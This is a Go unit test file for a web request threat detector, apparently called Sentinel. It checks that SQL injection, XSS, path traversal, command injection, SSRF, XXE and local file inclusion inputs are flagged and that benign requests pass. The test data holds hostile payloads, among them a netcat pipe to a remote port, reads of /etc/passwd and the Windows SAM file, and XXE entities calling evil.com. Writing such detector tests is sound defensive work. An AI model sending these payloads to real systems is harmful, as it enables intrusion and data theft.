package detection

import (
	"testing"

	sentinel "github.com/MUKE-coder/sentinel/core"
)

func TestSQLiDetection(t *testing.T) {
	payloads := []string{
		"1' OR '1'='1",
		"1; DROP TABLE users--",
		"' UNION SELECT * FROM users--",
		"1' AND SLEEP(5)--",
		"'; INSERT INTO users VALUES('hacker','pass')--",
		"1' OR 1=1--",
		"admin'--",
		"1; EXEC xp_cmdshell('dir')--",
	}

	for _, payload := range payloads {
		t.Run(payload, func(t *testing.T) {
			req := sentinel.InspectedRequest{
				RawQuery: "id=" + payload,
			}
			matches := ClassifyRequest(req)
			if len(matches) == 0 {
				t.Errorf("expected SQLi detection for payload: %s", payload)
			}

			hasSQLi := false
			for _, m := range matches {
				if m.ThreatType == sentinel.ThreatSQLi {
					hasSQLi = true
					break
				}
			}
			if !hasSQLi {
				t.Errorf("expected SQLi type for payload: %s, got types: %v", payload, matchTypes(matches))
			}
		})
	}
}

func TestXSSDetection(t *testing.T) {
	payloads := []string{
		"<script>alert('xss')</script>",
		"javascript:alert(1)",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"%3cscript%3ealert(1)%3c/script%3e",
		"<iframe src='evil.com'>",
	}

	for _, payload := range payloads {
		t.Run(payload, func(t *testing.T) {
			req := sentinel.InspectedRequest{
				RawQuery: "q=" + payload,
			}
			matches := ClassifyRequest(req)
			if len(matches) == 0 {
				t.Errorf("expected XSS detection for payload: %s", payload)
			}

			hasXSS := false
			for _, m := range matches {
				if m.ThreatType == sentinel.ThreatXSS {
					hasXSS = true
					break
				}
			}
			if !hasXSS {
				t.Errorf("expected XSS type for payload: %s, got types: %v", payload, matchTypes(matches))
			}
		})
	}
}

func TestPathTraversalDetection(t *testing.T) {
	payloads := []string{
		"../../etc/passwd",
		"..\\..\\windows\\system32\\config\\sam",
		"%2e%2e%2f%2e%2e%2fetc%2fpasswd",
	}

	for _, payload := range payloads {
		t.Run(payload, func(t *testing.T) {
			req := sentinel.InspectedRequest{
				Path: "/files/" + payload,
			}
			matches := ClassifyRequest(req)
			if len(matches) == 0 {
				t.Errorf("expected PathTraversal detection for payload: %s", payload)
			}
		})
	}
}

func TestCommandInjectionDetection(t *testing.T) {
	payloads := []string{
		"; ls -la",
		"; cat /etc/passwd",
		"; whoami",
		"| nc 10.0.0.1 4444",
		"$(whoami)",
		"`id`",
	}

	for _, payload := range payloads {
		t.Run(payload, func(t *testing.T) {
			req := sentinel.InspectedRequest{
				RawQuery: "cmd=" + payload,
			}
			matches := ClassifyRequest(req)
			hasCmdInj := false
			for _, m := range matches {
				if m.ThreatType == sentinel.ThreatCommandInjection {
					hasCmdInj = true
					break
				}
			}
			if !hasCmdInj {
				t.Errorf("expected CommandInjection for payload: %s, got types: %v", payload, matchTypes(matches))
			}
		})
	}
}

func TestSSRFDetection(t *testing.T) {
	payloads := []string{
		"http://localhost:8080/admin",
		"http://127.0.0.1/admin",
		"http://169.254.169.254/latest/meta-data",
		"file:///etc/passwd",
	}

	for _, payload := range payloads {
		t.Run(payload, func(t *testing.T) {
			req := sentinel.InspectedRequest{
				RawQuery: "url=" + payload,
			}
			matches := ClassifyRequest(req)
			if len(matches) == 0 {
				t.Errorf("expected SSRF detection for payload: %s", payload)
			}
		})
	}
}

func TestXXEDetection(t *testing.T) {
	payloads := []string{
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`,
		`<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>`,
	}

	for _, payload := range payloads {
		t.Run(payload[:30], func(t *testing.T) {
			req := sentinel.InspectedRequest{
				Body: payload,
			}
			matches := ClassifyRequest(req)
			if len(matches) == 0 {
				t.Errorf("expected XXE detection for payload")
			}
		})
	}
}

func TestLFIDetection(t *testing.T) {
	payloads := []string{
		"/etc/passwd",
		"/proc/self/environ",
		"/var/log/apache2/access.log",
		"C:\\windows\\system32\\config\\sam",
	}

	for _, payload := range payloads {
		t.Run(payload, func(t *testing.T) {
			req := sentinel.InspectedRequest{
				RawQuery: "file=" + payload,
			}
			matches := ClassifyRequest(req)
			if len(matches) == 0 {
				t.Errorf("expected LFI detection for payload: %s", payload)
			}
		})
	}
}

func TestLegitimateRequestsNotFlagged(t *testing.T) {
	legitimateRequests := []sentinel.InspectedRequest{
		{
			Method:   "GET",
			Path:     "/api/products",
			RawQuery: "page=1&limit=20",
		},
		{
			Method:   "GET",
			Path:     "/api/users/123",
			RawQuery: "",
		},
		{
			Method: "POST",
			Path:   "/api/products",
			Body:   `{"name":"Widget","price":19.99,"description":"A great product"}`,
		},
		{
			Method:   "GET",
			Path:     "/api/search",
			RawQuery: "q=blue+shoes&category=footwear",
		},
		{
			Method:   "GET",
			Path:     "/api/orders",
			RawQuery: "status=pending&sort=created_at&order=desc",
		},
	}

	for i, req := range legitimateRequests {
		t.Run(req.Path, func(t *testing.T) {
			matches := ClassifyRequest(req)
			if len(matches) > 0 {
				t.Errorf("legitimate request %d flagged with %d matches: %v",
					i, len(matches), matchTypes(matches))
			}
		})
	}
}

func TestScoreThreats(t *testing.T) {
	// Single SQLi match
	matches := []ThreatMatch{
		{ThreatType: sentinel.ThreatSQLi, BaseSeverity: sentinel.SeverityHigh, BaseConfidence: 80},
	}
	severity, confidence := ScoreThreats(matches)
	if severity != sentinel.SeverityHigh {
		t.Errorf("expected High severity, got %s", severity)
	}
	if confidence < 70 {
		t.Errorf("expected confidence >= 70, got %d", confidence)
	}

	// Multiple different types → elevated severity
	matches = []ThreatMatch{
		{ThreatType: sentinel.ThreatSQLi, BaseSeverity: sentinel.SeverityHigh, BaseConfidence: 80},
		{ThreatType: sentinel.ThreatXSS, BaseSeverity: sentinel.SeverityHigh, BaseConfidence: 75},
		{ThreatType: sentinel.ThreatCommandInjection, BaseSeverity: sentinel.SeverityCritical, BaseConfidence: 85},
	}
	severity, confidence = ScoreThreats(matches)
	if severity != sentinel.SeverityCritical {
		t.Errorf("expected Critical severity for 3+ types, got %s", severity)
	}

	// SQLi + CommandInjection combo → Critical
	matches = []ThreatMatch{
		{ThreatType: sentinel.ThreatSQLi, BaseSeverity: sentinel.SeverityHigh, BaseConfidence: 80},
		{ThreatType: sentinel.ThreatCommandInjection, BaseSeverity: sentinel.SeverityCritical, BaseConfidence: 85},
	}
	severity, _ = ScoreThreats(matches)
	if severity != sentinel.SeverityCritical {
		t.Errorf("expected Critical for SQLi+CmdInj combo, got %s", severity)
	}
}

func TestMatchesToEvidence(t *testing.T) {
	matches := []ThreatMatch{
		{PatternName: "SQLi_Basic", Matched: "' OR 1=1--", Location: "query", Parameter: "id"},
	}
	evidence := MatchesToEvidence(matches)
	if len(evidence) != 1 {
		t.Errorf("expected 1 evidence, got %d", len(evidence))
	}
	if evidence[0].Pattern != "SQLi_Basic" {
		t.Errorf("expected pattern SQLi_Basic, got %s", evidence[0].Pattern)
	}
}

func TestMatchesToThreatTypes(t *testing.T) {
	matches := []ThreatMatch{
		{ThreatType: sentinel.ThreatSQLi},
		{ThreatType: sentinel.ThreatSQLi},
		{ThreatType: sentinel.ThreatXSS},
	}
	types := MatchesToThreatTypes(matches)
	if len(types) != 2 {
		t.Errorf("expected 2 unique types, got %d: %v", len(types), types)
	}
}

func TestBodyScanning(t *testing.T) {
	req := sentinel.InspectedRequest{
		Method: "POST",
		Path:   "/api/login",
		Body:   `{"username":"admin' OR '1'='1","password":"test"}`,
	}
	matches := ClassifyRequest(req)
	if len(matches) == 0 {
		t.Error("expected SQLi detection in request body")
	}
}

func TestHeaderScanning(t *testing.T) {
	req := sentinel.InspectedRequest{
		Method: "GET",
		Path:   "/api/test",
		Headers: map[string][]string{
			"Referer": {"http://evil.com/<script>alert(1)</script>"},
		},
	}
	matches := ClassifyRequest(req)
	if len(matches) == 0 {
		t.Error("expected XSS detection in Referer header")
	}
}

func matchTypes(matches []ThreatMatch) []string {
	var types []string
	for _, m := range matches {
		types = append(types, string(m.ThreatType))
	}
	return types
}
